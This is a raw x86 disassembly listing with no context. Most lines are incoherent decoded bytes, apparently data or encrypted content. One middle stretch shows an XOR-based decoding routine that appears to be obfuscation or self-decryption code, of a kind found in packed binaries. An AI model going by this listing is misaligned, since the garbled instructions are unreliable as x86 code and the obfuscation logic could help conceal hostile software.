  4093bf:	inc    ecx
  4093c0:	lods   eax,DWORD PTR ds:[esi]
  4093c1:	adc    edi,DWORD PTR [esi+edi*8+0x33]
  4093c5:	stc    
  4093c6:	jg     0x40938f
  4093c8:	std    
  4093c9:	inc    ebx
  4093ca:	mov    ecx,0x3a0c2dbc
  4093cf:	stos   BYTE PTR es:[edi],al
  4093d0:	sub    dl,BYTE PTR [ebx]
  4093d2:	add    ebp,edi
  4093d4:	js     0x40944e
  4093d6:	fsub   QWORD PTR [esi+ebx*8]
  4093d9:	pop    ebx
  4093da:	jne    0x4093d3
  4093dc:	sbb    eax,0x2eda5d7e
  4093e1:	jne    0x40944c
  4093e3:	call   0x4fab:0x8a2b60a6
  4093ea:	(bad)  
  4093eb:	bound  edi,QWORD PTR [ebx+eiz*8+0x63]
  4093ef:	xor    DWORD PTR [edx],eax
  4093f1:	fcomip st,st(1)
  4093f3:	xchg   ebx,eax
  4093f4:	test   al,0x1a
  4093f6:	mov    ebp,0x44827894
  4093fb:	(bad)  
  4093fc:	cmp    DWORD PTR [esi-0x3b34924f],eax
  409402:	mov    ebx,0x8ed3143f
  409407:	xchg   ebp,eax
  409408:	into   
  409409:	and    dl,BYTE PTR [esi+ecx*2+0x58]
  40940d:	fmul   st(2),st
  40940f:	mov    eax,ds:0xec7a4f62
  409414:	(bad)  
  409416:	out    dx,eax
  409417:	retf   
  409418:	add    dl,dh
  40941a:	scas   eax,DWORD PTR es:[edi]
  40941b:	(bad)  
  40941c:	add    DWORD PTR ds:[ecx],ebx
  40941f:	pop    eax
  409420:	and    ebx,ebx
  409422:	lahf   
  409423:	push   esp
  409424:	out    dx,al
  409425:	sub    edx,esi
  409427:	or     bl,0xe7
  40942a:	jmp    0x4093bb
  40942c:	icebp  
  40942d:	pop    eax
  40942e:	outs   dx,BYTE PTR ds:[esi]
  40942f:	adc    al,0x1c
  409431:	dec    esp
  409432:	xchg   dh,cl
  409434:	icebp  
  409435:	test   al,0x40
  409437:	loopne 0x409459
  409439:	call   0x48e9872
  40943e:	popa   
  40943f:	xor    al,0x31
  409441:	mov    WORD PTR [ebx-0x77],gs
  409444:	loope  0x4093f0
  409446:	pop    eax
  409447:	cld    
  409448:	ja     0x4093cf
  40944a:	lahf   
  40944b:	aaa    
  40944c:	mov    ds,WORD PTR [ebp-0x68]
  40944f:	push   0x84b335ac
  409454:	out    0x21,al
  409456:	loopne 0x409423
  409458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409459:	aam    0x4e
  40945b:	jns    0x409405
  40945d:	sub    al,BYTE PTR [eax-0x4]
  409460:	aad    0x9a
  409462:	dec    edx
  409463:	mov    edx,0x4a1a8d4
  409468:	pushf  
  409469:	ret    0x11b1
  40946c:	xor    BYTE PTR [ebx-0x4751a6ac],ah
  409472:	dec    ebp
  409473:	scas   al,BYTE PTR es:[edi]
  409474:	mov    ds:0x926d3205,al
  409479:	lods   eax,DWORD PTR ds:[esi]
  40947a:	jnp    0x4094bd
  40947c:	push   0x1550a076
  409481:	fisub  DWORD PTR [ecx-0x40745f10]
  409487:	adc    ebx,edx
  409489:	cmp    al,0xb7
  40948b:	pop    ss
  40948c:	aas    
  40948d:	in     eax,dx
  40948e:	icebp  
  40948f:	std    
  409490:	ficomp WORD PTR [ebx+0xd]
  409493:	or     esp,DWORD PTR [edx-0xd]
  409496:	std    
  409497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409498:	or     al,0x62
  40949a:	xchg   WORD PTR [eax-0x7b],bx
  40949e:	push   0xdd23a472
  4094a3:	jl     0x4094e7
  4094a5:	mov    ch,0x64
  4094a7:	and    esp,eax
  4094a9:	add    al,0xb7
  4094ab:	fs and eax,0x7d1559ed
  4094b1:	in     eax,0x41
  4094b3:	cli    
  4094b4:	cmc    
  4094b5:	fsubr  DWORD PTR [esi+ebp*4-0x4d]
  4094b9:	sbb    edx,DWORD PTR [ecx-0x66]
  4094bc:	add    al,0x3a
  4094be:	repz leave 
  4094c0:	setp   BYTE PTR [esi+ebx*8]
  4094c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094c5:	out    0xe8,al
  4094c7:	sub    edi,DWORD PTR [edi-0x350c6827]
  4094cd:	pop    ebp
  4094ce:	pop    esi
  4094cf:	loopne 0x409525
  4094d1:	sub    BYTE PTR [ecx-0xc1d158c],0xb6
  4094d8:	loopne 0x409485
  4094da:	mov    eax,0x2af9a58b
  4094df:	aam    0x78
  4094e1:	push   esp
  4094e2:	and    al,0xe9
  4094e4:	cld    
  4094e5:	fwait
  4094e6:	scas   al,BYTE PTR es:[edi]
  4094e7:	(bad)
  4094eb:	rcl    DWORD PTR [esi-0x45],1
  4094ee:	jnp    0x4094d2
  4094f0:	cmp    eax,0xeb3eabed
  4094f5:	gs dec ecx
  4094f7:	out    0xa9,eax
  4094f9:	push   ecx
  4094fa:	clc    
  4094fb:	mov    ds:0x3efc6ac7,al
  409500:	mov    cl,0xd6
  409502:	or     BYTE PTR [ebx+ebp*2],cl
  409505:	xchg   edx,eax
  409506:	stos   BYTE PTR es:[edi],al
  409507:	inc    edi
  409508:	aaa    
  409509:	(bad)  
  40950a:	pop    ebx
  40950b:	pop    edx
  40950c:	push   eax
  40950d:	add    BYTE PTR [edx],al
  40950f:	pop    ds
  409510:	mov    esi,0x4e51654b
  409515:	les    esp,FWORD PTR ds:0xd431cb7
  40951b:	or     edi,esi
  40951d:	fwait
  40951e:	add    al,0xa7
  409520:	push   esp
  409521:	adc    DWORD PTR [ebx-0x2ea35125],ecx
  409527:	add    dh,BYTE PTR [esi+0x74]
  40952a:	cmp    eax,0xfff7ff21
  40952f:	repz or eax,DWORD PTR [edi]
  409532:	pop    ebx
  409533:	mov    DWORD PTR [edi],eax
  409535:	mov    DWORD PTR [eax-0x71325a55],edi
  40953b:	loopne 0x40950d
  40953d:	lds    esi,FWORD PTR ds:0xe04c821c
  409543:	ret    
  409544:	push   ebp
  409545:	xor    ch,cl
  409547:	ficomp WORD PTR [eax]
  409549:	adc    DWORD PTR [edi-0x763da10e],edx
  40954f:	pop    esp
  409550:	adc    dh,BYTE PTR [edi]
  409552:	mov    eax,0xd90fc9b1
  409557:	mov    dl,0x8b
  409559:	ror    BYTE PTR [ebx*4+0x1e9bb723],cl
  409560:	aad    0x27
  409562:	(bad)  
  409564:	repz cmp ecx,edx
  409567:	and    BYTE PTR [eax+0x5f],dh
  40956a:	jns    0x4094ff
  40956c:	ja     0x409508
  40956e:	mov    ds:0xbf249882,al
  409573:	jb     0x409577
  409575:	cmp    eax,0xe9ad1b23
  40957a:	mov    bh,BYTE PTR [ecx+0x72]
  40957d:	jmp    0x409513
  40957f:	mov    bl,BYTE PTR es:[ebx]
  409582:	xor    eax,0x2624b98e
  409587:	xor    DWORD PTR [edx],ebp
  409589:	int3   
  40958a:	jge    0x40953a
  40958c:	call   0xebfcd0a0
  409591:	sbb    bh,dl
  409593:	ss cs retf 
  409596:	out    dx,al
  409597:	pop    ebp
  409598:	add    ch,BYTE PTR [eax+0x7bb8a81d]
  40959e:	leave  
  40959f:	sub    BYTE PTR [esi],0x29
  4095a2:	and    edx,DWORD PTR [edi]
  4095a4:	inc    esi
  4095a5:	stc    
  4095a6:	popf   
  4095a7:	mov    ebx,0xe862e1e6
  4095ac:	jbe    0x409563
  4095ae:	enter  0xb51d,0x7d
  4095b2:	ja     0x4095ed
  4095b4:	in     eax,0x5f
  4095b6:	pop    ebp
  4095b7:	das    
  4095b8:	jb     0x409606
  4095ba:	jge    0x4095a1
  4095bc:	mov    BYTE PTR [edi+0x30],al
  4095bf:	int    0x58
  4095c1:	add    DWORD PTR [eax+esi*8],edx
  4095c4:	lods   eax,DWORD PTR ds:[esi]
  4095c5:	push   esp
  4095c6:	bound  ebx,QWORD PTR [ebx+ecx*8-0x2a]
  4095ca:	jle    0x409610
  4095cc:	mov    bh,0x6d
  4095ce:	mov    ecx,0x3fa64227
  4095d3:	add    BYTE PTR es:[edx+0x656158dc],bh
  4095da:	xchg   edi,eax
  4095db:	cmp    edx,DWORD PTR [ecx-0x18c8dbf]
  4095e1:	add    ah,al
  4095e3:	fs jb  0x4095d4
  4095e6:	imul   ecx,DWORD PTR ds:0x51cda28c,0xb58c65e2
  4095f0:	sahf   
  4095f1:	push   eax
  4095f2:	sti    
  4095f3:	sub    BYTE PTR [ebx-0x3b],dl
  4095f6:	aas    
  4095f7:	mov    ch,0xf6
  4095f9:	sub    al,0xa
  4095fb:	arpl   WORD PTR [ebp-0x34],di
  4095fe:	in     eax,dx
  4095ff:	dec    edi
  409600:	or     ebp,0xffffffa2
  409603:	bound  esp,QWORD PTR [ebx+0x7c]
  409606:	mov    ds:0x56c7b956,al
  40960b:	push   ss
  40960c:	jmp    0x5e4603aa
  409611:	mov    bh,0xb
  409613:	js     0x40962a
  409615:	fs mov ebp,ebp
  409618:	sub    ebx,0xffffffe7
  40961b:	mov    dh,0x72
  40961d:	push   ds
  40961e:	xlat   BYTE PTR ds:[ebx]
  40961f:	push   eax
  409620:	xchg   BYTE PTR [ebx-0x234c542d],dh
  409626:	xor    eax,DWORD PTR [ecx-0x74d1f451]
  40962c:	push   ss
  40962d:	shl    eax,0x2
  409630:	mov    DWORD PTR [ebp+0x10],edx
  409633:	mov    edx,DWORD PTR [esi+0x4]
  409636:	xor    eax,0xca79a575
  40963b:	mov    DWORD PTR [ebp+0x14],edx
  40963e:	cmp    eax,DWORD PTR [ebp+0x10]
  409641:	jne    0x4096f4
  409647:	mov    eax,edx
  409649:	cmp    DWORD PTR [ebp+0xc],eax
  40964c:	jne    0x4096f4
  409652:	mov    eax,DWORD PTR [esi]
  409654:	mov    edx,DWORD PTR [esi+0x4]
  409657:	mov    eax,DWORD PTR [esi]
  409659:	mov    edx,DWORD PTR [esi+0x4]
  40965c:	xor    eax,0xca79a577
  409661:	xor    edx,ecx
  409663:	mov    ecx,eax
  409665:	mov    eax,edx
  409667:	shrd   ecx,eax,0x2
  40966b:	shr    eax,0x2
  40966e:	mov    DWORD PTR [ebp+0xc],eax
  409671:	mov    eax,DWORD PTR [esi]
  409673:	mov    edx,DWORD PTR [esi+0x4]
  409676:	mov    edx,eax
  409678:	xor    eax,eax
  40967a:	or     eax,ecx
  40967c:	mov    ecx,DWORD PTR [ebx]
  40967e:	shl    edx,0x1e
  409681:	xor    edx,0x40000000
  409687:	mov    DWORD PTR [ebp+0x10],eax
  40968a:	mov    eax,edx
  40968c:	or     eax,DWORD PTR [ebp+0xc]
  40968f:	mov    edx,DWORD PTR [ebx+0x4]
  409692:	push   eax
  409693:	push   DWORD PTR [ebp+0x10]
  409696:	push   edx
  409697:	push   ecx
  409698:	call   0x416c20
  40969d:	mov    eax,DWORD PTR [esi]
  40969f:	mov    ecx,DWORD PTR [esi+0x4]
  4096a2:	shrd   eax,ecx,0x2
  4096a6:	shr    ecx,0x2
  4096a9:	shr    edx,0x1e
  4096ac:	xor    ecx,0xe706e27a
  4096b2:	push   ecx
  4096b3:	xor    eax,edi
  4096b5:	mov    DWORD PTR [ebp+0x10],edx
  4096b8:	mov    edx,DWORD PTR [ebx]
  4096ba:	mov    edi,DWORD PTR [ebx+0x4]
  4096bd:	push   eax
  4096be:	push   edi
  4096bf:	push   edx
  4096c0:	call   0x416c20
  4096c5:	shld   edx,eax,0x2
  4096c9:	mov    ecx,edx
  4096cb:	xor    edx,edx
  4096cd:	or     ecx,edx
  4096cf:	mov    edx,DWORD PTR [esi]
  4096d1:	mov    edi,DWORD PTR [esi+0x4]
  4096d4:	shl    eax,0x2
  4096d7:	or     eax,DWORD PTR [ebp+0x10]
  4096da:	xor    edi,ecx
  4096dc:	xor    edx,eax
  4096de:	xor    edx,0xca79a575
  4096e4:	xor    edi,0x9c1b89e8
  4096ea:	mov    DWORD PTR [esi],edx
  4096ec:	mov    DWORD PTR [esi+0x4],edi
  4096ef:	jmp    0x40a921
  4096f4:	mov    eax,DWORD PTR [ebp-0x24]
  4096f7:	add    eax,DWORD PTR [ebp-0x4]
  4096fa:	mov    DWORD PTR [ebp-0x28],eax
  4096fd:	mov    eax,DWORD PTR [ebp-0x28]
  409700:	mov    eax,DWORD PTR [ebp-0x4]
  409703:	mov    eax,DWORD PTR [ebp-0x28]
  409706:	mov    eax,DWORD PTR [eax+0xc]
  409709:	mov    edx,DWORD PTR [ebp-0x4]
  40970c:	movzx  eax,WORD PTR [edx+eax*1]
  409710:	cdq    
  409711:	shld   edx,eax,0x2
  409715:	xor    edx,ecx
  409717:	mov    DWORD PTR [ebp+0xc],edx
  40971a:	mov    edx,DWORD PTR [ebp-0x58]
  40971d:	shl    eax,0x2
  409720:	mov    DWORD PTR [ebp+0x10],edx
  409723:	mov    edx,DWORD PTR [ebp-0x54]
  409726:	xor    eax,0xca79a575
  40972b:	mov    DWORD PTR [ebp+0x14],edx
  40972e:	cmp    eax,DWORD PTR [ebp+0x10]
  409731:	jne    0x40a0d1
  409737:	mov    eax,edx
  409739:	cmp    DWORD PTR [ebp+0xc],eax
  40973c:	jne    0x40a0d1
  409742:	mov    DWORD PTR [ebp+0x8],0xca79a575
  409749:	mov    DWORD PTR [ebp+0xc],ecx
  40974c:	mov    DWORD PTR [ebp-0x60],0xca79a571
  409753:	mov    DWORD PTR [ebp-0x5c],ecx
  409756:	mov    DWORD PTR [ebp-0x48],0xca79a57d
  40975d:	mov    DWORD PTR [ebp-0x44],ecx
  409760:	mov    DWORD PTR [ebp-0x38],0xca79a579
  409767:	mov    DWORD PTR [ebp-0x34],ecx
  40976a:	mov    eax,DWORD PTR [ebp+0x8]
  40976d:	mov    ecx,DWORD PTR [ebp+0xc]
  409770:	shrd   eax,ecx,0x2
  409774:	shr    ecx,0x2
  409777:	mov    ecx,DWORD PTR [ebp+0x8]
  40977a:	mov    edx,DWORD PTR [ebp+0xc]
  40977d:	xor    eax,edi
  40977f:	shl    ecx,0x1e
  409782:	xor    edx,edx
  409784:	or     eax,edx
  409786:	add    eax,DWORD PTR ds:0x422568
  40978c:	mov    DWORD PTR [ebp+0x14],eax
  40978f:	mov    eax,DWORD PTR [ebp+0x8]
  409792:	mov    ecx,DWORD PTR [ebp+0xc]
  409795:	shrd   eax,ecx,0x2
  409799:	shr    ecx,0x2
  40979c:	mov    ecx,DWORD PTR [ebp+0x8]
  40979f:	mov    edx,DWORD PTR [ebp+0xc]
  4097a2:	xor    eax,edi
  4097a4:	shl    ecx,0x1e
  4097a7:	xor    edx,edx
  4097a9:	or     eax,edx
  4097ab:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  4097af:	mov    eax,DWORD PTR [ebp+0x14]
  4097b2:	xor    BYTE PTR [eax],cl
  4097b4:	mov    eax,DWORD PTR [ebp-0x60]
  4097b7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4097ba:	shrd   eax,ecx,0x2
  4097be:	shr    ecx,0x2
  4097c1:	mov    ecx,DWORD PTR [ebp-0x60]
  4097c4:	mov    edx,DWORD PTR [ebp-0x5c]
  4097c7:	xor    eax,edi
  4097c9:	shl    ecx,0x1e
  4097cc:	jmp    0x409baa
  4097d1:	or     bh,dh
  4097d3:	cmp    BYTE PTR [esi-0x6574e1dc],dh
  4097d9:	mov    esi,0x38bca5c6
  4097de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097df:	mov    cl,0xb0
  4097e1:	inc    edi
  4097e2:	inc    ecx
  4097e3:	sbb    BYTE PTR [eax],bl
  4097e5:	sahf   
  4097e6:	adc    bl,BYTE PTR [eax]
  4097e8:	sbb    BYTE PTR [ecx+0x2f],al
  4097eb:	ins    BYTE PTR es:[edi],dx
  4097ec:	xor    DWORD PTR [edi+0x3f264b37],edi
  4097f2:	int    0x75
  4097f4:	mov    al,ds:0x1950e2c3
  4097f9:	dec    ebx
  4097fa:	addr16 and edi,ebp
  4097fd:	add    al,0xbb
  4097ff:	lds    ebx,FWORD PTR [ecx+0x7e72a93b]
  409805:	pop    ds
  409806:	jno    0x40979c
  409808:	jg     0x4097dd
  40980a:	xchg   esi,eax
  40980b:	call   0xb195:0xea33dc5a
  409812:	enter  0x160a,0x72
  409816:	rol    BYTE PTR [ecx],1
  409818:	push   esp
  409819:	data16 fwait
  40981b:	cld    
  40981c:	mov    dh,0x79
  40981e:	sbb    bl,BYTE PTR [esp+ecx*1-0x2e87d512]
  409825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409826:	pop    edi
  409827:	call   0x8b52a6b9
  40982c:	mov    bl,0xcc
  40982e:	add    ah,BYTE PTR [esi]
  409830:	sub    ch,dh
  409832:	push   ss
  409833:	adc    dl,BYTE PTR [eax+0x60]
  409836:	jle    0x4097ba
  409838:	xchg   DWORD PTR [eax],ebp
  40983a:	pop    edx
  40983b:	mov    fs,WORD PTR [edi-0x7a]
  40983e:	retf   
  40983f:	shr    cl,0xd
  409842:	push   ecx
  409843:	xor    eax,0x48fadf46
  409848:	xchg   edi,eax
  409849:	mov    bl,0xd5
  40984b:	mov    ebp,0x2dfc504c
  409850:	sub    eax,0x2dfb7f4d
  409855:	sub    esp,DWORD PTR fs:[eax]
  409858:	fs dec edi
  40985a:	ins    BYTE PTR es:[edi],dx
  40985b:	ret    
  40985c:	xor    eax,0x9bde0ff7
  409861:	inc    ebx
  409862:	retf   
  409863:	retf   0x952c
  409866:	adc    al,0x8e
  409868:	(bad)
  40986b:	mov    ds:0x6e5cb3a3,al
  409870:	xchg   ebx,eax
  409871:	das    
  409872:	clc    
  409873:	xchg   ebp,eax
  409874:	pop    esp
  409875:	and    al,0xab
  409877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409878:	pop    ss
  409879:	lock mov al,ds:0x48ea260
  40987f:	rcr    DWORD PTR [edi-0x6],1
  409882:	mov    dh,0x88
  409884:	dec    ebx
  409885:	inc    esi
  409886:	test   eax,0xac96ea1a
  40988b:	push   es
  40988c:	cmp    esi,DWORD PTR [ecx+0x53e94bfc]
  409892:	stc    
  409893:	sahf   
  409894:	or     BYTE PTR ds:0x8ac387a9,dl
  40989a:	std    
  40989b:	outs   dx,DWORD PTR ds:[esi]
  40989c:	or     DWORD PTR [eax+0x1c],ebx
  40989f:	adc    eax,0x98876543
  4098a4:	mov    ebx,0xa2de5d3b
  4098a9:	jae    0x4098a4
  4098ab:	call   0xf859b9fe
  4098b0:	lods   eax,DWORD PTR ds:[esi]
  4098b1:	pop    esi
  4098b2:	(bad)  
  4098b3:	jno    0x4098ed
  4098b5:	fisttp WORD PTR [edi-0xe]
  4098b8:	mov    bh,0x16
  4098ba:	repnz sbb ah,BYTE PTR [ebp+eiz*2-0x738a099]
  4098c2:	gs out dx,al
  4098c4:	dec    ebx
  4098c5:	std    
  4098c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098c7:	sub    dl,BYTE PTR fs:[ecx]
  4098ca:	inc    esp
  4098cb:	retf   0x6a0
  4098ce:	jae    0x40993b
  4098d0:	(bad)  
  4098d1:	dec    ecx
  4098d2:	leave  
  4098d3:	mov    BYTE PTR [eax+0x11],al
  4098d6:	scas   eax,DWORD PTR es:[edi]
  4098d7:	mov    esp,0x3268dbc8
  4098dc:	mov    edi,DWORD PTR [edx+0x473f4506]
  4098e2:	add    al,BYTE PTR [ebp-0x2e858f02]
  4098e8:	xchg   DWORD PTR [edx+0x7d],esi
  4098eb:	inc    ebp
  4098ec:	sub    DWORD PTR ds:0x68299a70,0x5c
  4098f3:	xchg   ebx,eax
  4098f4:	mov    bl,0x7d
  4098f6:	mov    eax,ds:0x2bb2615d
  4098fb:	mov    ah,0x49
  4098fd:	mov    ah,0x35
  4098ff:	jg     0x40992b
  409901:	fs inc edi
  409903:	(bad)  
  409904:	jno    0x4098f6
  409906:	cmp    bl,BYTE PTR [esi]
  409908:	pop    esp
  409909:	(bad)  
  40990a:	neg    edi
  40990c:	out    dx,eax
  40990d:	push   eax
  40990e:	xor    al,0x2c
  409910:	div    DWORD PTR [eax+edx*8+0x1d]
  409914:	aad    0xad
  409916:	xchg   DWORD PTR [ebx+0x54],esi
  409919:	shl    BYTE PTR [edi-0x1a],0x3e
  40991d:	test   al,0xe4
  40991f:	jne    0x4098f5
  409921:	popf   
  409922:	test   al,0xa7
  409924:	frstor [ebx]
  409926:	hlt    
  409927:	clc    
  409928:	inc    edi
  409929:	loope  0x40993e
  40992b:	repnz xchg ebx,eax
  40992d:	xor    BYTE PTR [ebp+0x25a5a162],bh
  409933:	mov    al,ds:0x71a9eecf
  409938:	sbb    al,0xf5
  40993a:	std    
  40993b:	pop    ecx
  40993c:	(bad)
  409940:	mov    al,ds:0xea5d4770
  409945:	fwait
  409946:	pop    esi
  409947:	shr    DWORD PTR [ebx],0xfd
  40994a:	push   esi
  40994b:	or     eax,0xdb05889d
  409950:	call   0x43062c62
  409955:	retf   0xab4f
  409958:	mov    eax,0x6dd9953c
  40995d:	scas   al,BYTE PTR es:[edi]
  40995e:	push   0xf548848
  409963:	jge    0x409930
  409965:	shr    BYTE PTR ds:0x2511046c,cl
  40996b:	retf   
  40996c:	div    BYTE PTR [edx+0x5f8370e6]
  409972:	ss in  eax,0xd7
  409975:	fdivr  QWORD PTR [edi+0x60]
  409978:	pop    edi
  409979:	cdq    
  40997a:	es or  ecx,ebp
  40997d:	mov    al,0x69
  40997f:	xor    eax,0xbd0f14e7
  409984:	pop    esi
  409985:	pop    ebx
  409986:	(bad)  
  409987:	mov    edi,DWORD PTR [ebx+0x52840d1b]
  40998d:	lds    eax,FWORD PTR [eax-0x2b59077e]
  409993:	jno    0x40991d
  409995:	ret    0x26ca
  409998:	xlat   BYTE PTR ds:[ebx]
  409999:	cmp    BYTE PTR ds:0x168327a5,bl
  40999f:	cmp    ecx,DWORD PTR [eax]
  4099a1:	js     0x4099b9
  4099a3:	call   0xa8e6790
  4099a8:	add    eax,0xa9f805b7
  4099ad:	daa    
  4099ae:	jle    0x40996c
  4099b0:	loop   0x4099dc
  4099b2:	fucomp st(4)
  4099b4:	(bad)  
  4099b6:	ja     0x40999f
  4099b8:	mov    ds:0x5eca6885,eax
  4099bd:	pusha  
  4099be:	ins    BYTE PTR es:[edi],dx
  4099bf:	cdq    
  4099c0:	(bad)  
  4099c1:	adc    eax,0x599633bb
  4099c6:	mov    al,0x86
  4099c8:	sar    BYTE PTR ds:0x535732ae,0x49
  4099cf:	sub    BYTE PTR [esi+0x5aad7985],cl
  4099d5:	mov    eax,ds:0x5b4c59b8
  4099da:	addr16 cdq 
  4099dc:	out    0x2f,al
  4099de:	sahf   
  4099df:	cmp    ebp,ebx
  4099e1:	jle    0x409a2d
  4099e3:	jecxz  0x409973
  4099e5:	fild   WORD PTR [edx+eax*1+0x3b832f50]
  4099ec:	and    ah,BYTE PTR [esi+eax*2]
  4099ef:	jae    0x409a05
  4099f1:	sub    BYTE PTR [eax],bl
  4099f3:	pop    eax
  4099f4:	sub    eax,0xaaaf830c
  4099f9:	ss pop eax
  4099fb:	cmp    eax,0x4c5b204f
  409a00:	sbb    bl,cl
  409a02:	mov    ah,BYTE PTR [edi+0x64]
  409a05:	and    DWORD PTR [ebx+0x3a4e6485],ebx
  409a0b:	popa   
  409a0c:	scas   al,BYTE PTR es:[edi]
  409a0d:	int3   
  409a0e:	pushf  
  409a0f:	adc    eax,0x9e66ac7f
  409a14:	and    ecx,ecx
  409a16:	(bad)  
  409a17:	cmp    BYTE PTR [ebx+0x64f503b8],cl
  409a1d:	lods   eax,DWORD PTR ds:[esi]
  409a1e:	jae    0x4099d9
  409a20:	xchg   ecx,eax
  409a21:	xor    DWORD PTR [ecx],edx
  409a23:	fbld   TBYTE PTR [esi]
  409a25:	enter  0xf24e,0x9a
  409a29:	sub    ebx,edx
  409a2b:	sbb    eax,0xf36521ad
  409a30:	test   DWORD PTR [esi-0x588beeb0],ecx
  409a36:	(bad)  
  409a38:	push   cs
  409a39:	mov    WORD PTR [ebp+0x5c381a72],fs
  409a3f:	push   ds
  409a40:	adc    al,0xa0
  409a42:	ror    DWORD PTR [edi+0x2a],cl
  409a45:	dec    edi
  409a46:	or     DWORD PTR [esi+ebx*8],edx
  409a49:	outs   dx,BYTE PTR ds:[esi]
  409a4a:	and    DWORD PTR [esi],ecx
  409a4c:	mov    dl,0xa7
  409a4e:	retf   0xdf78
  409a51:	cwde   
  409a52:	outs   dx,DWORD PTR ds:[esi]
  409a53:	sbb    ebp,DWORD PTR [edx-0x6fe299d9]
  409a59:	imul   ebp,DWORD PTR [ebp-0x2b83fac7],0x3b3d3ad4
  409a63:	ror    BYTE PTR ds:0xff3d4521,cl
  409a69:	fsubr  DWORD PTR [edi+0x39]
  409a6c:	and    DWORD PTR [esi+0x7],eax
  409a6f:	push   ecx
  409a70:	dec    eax
  409a71:	loop   0x409aa6
  409a73:	and    BYTE PTR [ecx+0x27],0x8
  409a77:	adc    eax,0xb127b592
  409a7c:	in     al,dx
  409a7d:	mov    ebp,0x82ccec21
  409a82:	call   0x7a71:0x8aad678f
  409a89:	aam    0xce
  409a8b:	aam    0xc3
  409a8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a8f:	scas   al,BYTE PTR es:[edi]
  409a90:	or     al,0x22
  409a92:	test   BYTE PTR [eax+0x6ac42206],ah
  409a98:	xchg   ecx,eax
  409a99:	das    
  409a9a:	mov    eax,0xb5c3719a
  409a9f:	dec    BYTE PTR [esi]
  409aa1:	jno    0x409a7d
  409aa3:	add    BYTE PTR [ecx-0x39c6348a],0x4
  409aaa:	hlt    
  409aab:	sbb    DWORD PTR [ebx-0x56],0xffffffe4
  409aaf:	push   esp
  409ab0:	cli    
  409ab1:	dec    eax
  409ab2:	je     0x409a80
  409ab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ab5:	sahf   
  409ab6:	push   0x448b2f11
  409abb:	ret    
  409abc:	xchg   ebp,eax
  409abd:	les    ecx,FWORD PTR [esi-0x27dd9251]
  409ac3:	add    eax,0x76dbb83f
  409ac8:	pop    ds
  409ac9:	mov    al,ds:0x9349bacc
  409ace:	arpl   cx,bp
  409ad0:	fcomp  DWORD PTR [eax]
  409ad2:	repz fist DWORD PTR [edi+eax*1+0x61433809]
  409ada:	push   ebp
  409adb:	repnz lea esi,ds:0x3b8e47f0
  409ae2:	jbe    0x409b03
  409ae4:	stos   BYTE PTR es:[edi],al
  409ae5:	loopne 0x409ade
  409ae7:	pop    ecx
  409ae8:	sahf   
  409ae9:	add    DWORD PTR [ecx+0x41217135],eax
  409aef:	nop
  409af0:	push   edx
  409af1:	sbb    eax,0x8f05a051
  409af6:	stos   DWORD PTR es:[edi],eax
  409af7:	or     BYTE PTR [eax+0x7e389841],bl
  409afd:	ret    0xec18
  409b00:	icebp  
  409b01:	mov    edx,0xe0fe13bf
  409b06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b07:	gs sub eax,0xa361b1d7
  409b0d:	test   eax,0x2ff0876a
  409b12:	ds dec esi
  409b14:	sub    al,0xf0
  409b16:	enter  0x2d57,0x87
  409b1a:	jo     0x409b75
  409b1c:	push   eax
  409b1d:	(bad)  
  409b1e:	adc    bp,WORD PTR [esi+eiz*2+0x6a1f2950]
  409b26:	btc    DWORD PTR [edi+0x3a],esp
  409b2a:	enter  0x3e94,0xca
  409b2e:	aad    0x3f
  409b30:	jmp    0x409acf
  409b32:	inc    ebp
  409b33:	pop    edx
  409b34:	xchg   ebp,eax
  409b35:	add    eax,0xef2c5888
  409b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b3b:	test   eax,0xa75aef3c
  409b40:	outs   dx,DWORD PTR ds:[esi]
  409b41:	mov    bh,0xca
  409b43:	pop    ds
  409b44:	ins    BYTE PTR es:[edi],dx
  409b45:	dec    eax
  409b46:	cmp    eax,0x37a298a5
  409b4b:	mov    esi,0x50d3c4af
  409b50:	cmp    dl,BYTE PTR [ecx+0x67]
  409b53:	add    ch,BYTE PTR [eax]
  409b55:	mov    al,0x78
  409b57:	outs   dx,BYTE PTR ds:[esi]
  409b58:	mov    BYTE PTR [eax+0x74],bl
  409b5b:	mov    edi,0xb263b3fb
  409b60:	mov    bl,0xd9
  409b62:	and    esi,DWORD PTR [esi+0x5916fb6a]
  409b68:	mov    ch,0x76
  409b6a:	ffreep st(1)
  409b6c:	fdivr  QWORD PTR [ecx+0x70]
  409b6f:	fwait
  409b70:	ds push ebx
  409b72:	jns    0x409b80
  409b74:	sti    
  409b75:	cmp    edi,edi
  409b77:	pushf  
  409b78:	ins    BYTE PTR es:[edi],dx
  409b79:	fwait
  409b7a:	sar    dl,0x54
  409b7d:	push   cs
  409b7e:	out    dx,al
  409b7f:	or     BYTE PTR [edi+0x4ddefc74],0xff
  409b86:	lock adc bh,ch
  409b89:	sub    eax,0x5122ee06
  409b8e:	ret    0xa9b0
  409b91:	mov    cl,0x70
  409b93:	push   edx
  409b94:	dec    edx
  409b95:	es dec edi
  409b97:	lods   al,BYTE PTR ds:[esi]
  409b98:	mov    ebp,DWORD PTR ds:0x2738056e
  409b9e:	mov    ds:0x29de2c10,al
  409ba3:	adc    al,0x7a
  409ba5:	gs dec esp
  409ba7:	or     BYTE PTR [eax+0xbd233c4],dh
  409bad:	ret    0x503
  409bb0:	push   0x89004225
  409bb5:	inc    ebp
  409bb6:	adc    al,0x8b
  409bb8:	inc    ebp
  409bb9:	mov    al,ds:0xfa44d8b
  409bbe:	lods   al,BYTE PTR ds:[esi]
  409bbf:	enter  0xc102,0xe9
  409bc3:	add    cl,BYTE PTR [ebx+0x558ba04d]
  409bc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bca:	xor    eax,edi
  409bcc:	shl    ecx,0x1e
